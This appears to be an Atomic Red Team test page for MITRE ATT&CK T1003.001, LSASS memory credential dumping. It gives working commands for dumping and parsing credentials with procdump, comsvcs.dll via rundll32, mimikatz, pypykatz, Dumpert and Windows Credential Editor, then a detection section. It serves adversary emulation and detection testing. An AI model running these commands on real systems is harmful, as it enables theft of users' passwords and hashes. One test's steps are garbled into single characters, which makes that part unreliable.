# T1003.001 - OS Credential Dumping: LSASS Memory
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>


Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)


## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Windows Credential Editor
Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)

Upon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.

If you see no output it is likely that execution was blocked by Anti-Virus. 

If you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{wce_exe} -o #{output_file}
```

Invoke-AtomicTest T1003.001 -TestNumbers 1

### Atomic Test #2 - Dump LSASS.exe Memory using ProcDump
The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{procdump_exe} -accepteula -ma lsass.exe #{output_file}
```

Invoke-AtomicTest T1003.001 -TestNumbers 2

### Atomic Test #3 - Dump LSASS.exe Memory using comsvcs.dll
The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.

Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
```

Invoke-AtomicTest T1003.001 -TestNumbers 3

### Atomic Test #4 - Dump LSASS.exe Memory using direct system calls and API unhooking
The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
https://github.com/outflanknl/Dumpert
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
Upon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.

If you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{dumpert_exe}
```

Invoke-AtomicTest T1003.001 -TestNumbers 4

### Atomic Test #5 - Dump LSASS.exe Memory using Windows Task Manager
The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
Manager and administrative permissions.

**Supported Platforms:** windows
Run it with these steps!
1
.
 
O
p
e
n
 
T
a
s
k
 
M
a
n
a
g
e
r
:


 
 
O
n
 
a
 
W
i
n
d
o
w
s
 
s
y
s
t
e
m
 
t
h
i
s
 
c
a
n
 
b
e
 
a
c
c
o
m
p
l
i
s
h
e
d
 
b
y
 
p
r
e
s
s
i
n
g
 
C
T
R
L
-
A
L
T
-
D
E
L
 
a
n
d
 
s
e
l
e
c
t
i
n
g
 
T
a
s
k
 
M
a
n
a
g
e
r
 
o
r
 
b
y
 
r
i
g
h
t
-
c
l
i
c
k
i
n
g


 
 
o
n
 
t
h
e
 
t
a
s
k
 
b
a
r
 
a
n
d
 
s
e
l
e
c
t
i
n
g
 
"
T
a
s
k
 
M
a
n
a
g
e
r
"
.




2
.
 
S
e
l
e
c
t
 
l
s
a
s
s
.
e
x
e
:


 
 
I
f
 
l
s
a
s
s
.
e
x
e
 
i
s
 
n
o
t
 
v
i
s
i
b
l
e
,
 
s
e
l
e
c
t
 
"
S
h
o
w
 
p
r
o
c
e
s
s
e
s
 
f
r
o
m
 
a
l
l
 
u
s
e
r
s
"
.
 
T
h
i
s
 
w
i
l
l
 
a
l
l
o
w
 
y
o
u
 
t
o
 
o
b
s
e
r
v
e
 
e
x
e
c
u
t
i
o
n
 
o
f
 
l
s
a
s
s
.
e
x
e


 
 
a
n
d
 
s
e
l
e
c
t
 
i
t
 
f
o
r
 
m
a
n
i
p
u
l
a
t
i
o
n
.




3
.
 
D
u
m
p
 
l
s
a
s
s
.
e
x
e
 
m
e
m
o
r
y
:


 
 
R
i
g
h
t
-
c
l
i
c
k
 
o
n
 
l
s
a
s
s
.
e
x
e
 
i
n
 
T
a
s
k
 
M
a
n
a
g
e
r
.
 
S
e
l
e
c
t
 
"
C
r
e
a
t
e
 
D
u
m
p
 
F
i
l
e
"
.
 
T
h
e
 
f
o
l
l
o
w
i
n
g
 
d
i
a
l
o
g
 
w
i
l
l
 
s
h
o
w
 
y
o
u
 
t
h
e
 
p
a
t
h
 
t
o
 
t
h
e
 
s
a
v
e
d
 
f
i
l
e
.



### Atomic Test #6 - Offline Credential Theft With Mimikatz
The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
```

Invoke-AtomicTest T1003.001 -TestNumbers 6

### Atomic Test #7 - LSASS read with pypykatz
Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::

Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.

Successful execution of this test will display multiple useranames and passwords/hashes to the screen.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
pypykatz live lsa
```

Invoke-AtomicTest T1003.001 -TestNumbers 7

## Detection
Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.